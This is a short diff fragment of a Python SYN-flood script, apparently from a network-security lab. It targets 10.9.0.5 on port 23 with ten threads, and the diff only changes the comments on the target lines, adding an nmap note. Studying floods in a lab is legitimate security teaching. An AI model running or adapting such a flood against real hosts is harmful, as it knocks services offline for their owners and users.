@@ -17,8 +17,8 @@ def syn_flood(target_ip, target_port):
         send(pkt, verbose=0)
 
 if __name__ == "__main__":
-    target_ip = "10.9.0.5"  # Replace with actual target IP
-    target_port = 23        # Replace with actual target port
+    target_ip = "10.9.0.5"  #
+    target_port = 23        # nmap 10.9.0.5
 
     # Define number of threads (instances)
     num_threads = 10
